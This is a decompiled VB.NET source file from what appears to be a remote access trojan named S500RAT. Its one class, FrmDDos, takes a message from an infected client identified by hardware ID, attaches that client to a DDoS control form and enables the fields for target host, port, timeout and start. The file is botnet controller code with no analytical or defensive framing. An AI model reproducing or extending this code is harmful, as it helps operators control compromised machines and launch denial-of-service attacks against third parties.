Imports System
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000047 RID: 71
	Public Class FrmDDos
		' Token: 0x06001183 RID: 4483 RVA: 0x00097CE8 File Offset: 0x00095EE8
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim formDDos As FormDDos = CType(Application.OpenForms("FormDDos" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormDDos)
				Dim flag As Boolean = formDDos IsNot Nothing
				If flag Then
					Dim flag2 As Boolean = formDDos.Client Is Nothing
					If flag2 Then
						formDDos.Client = client
						formDDos.Timer1.Enabled = True
						formDDos.ListDDos.Enabled = True
						formDDos.DDosStart.Enabled = True
						formDDos.DDosHost.Enabled = True
						formDDos.DDosPort.Enabled = True
						formDDos.TimeOut.Enabled = True
						formDDos.Add_Info.Enabled = True
						formDDos.DDosRemove.Enabled = True
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub
	End Class
End Namespace
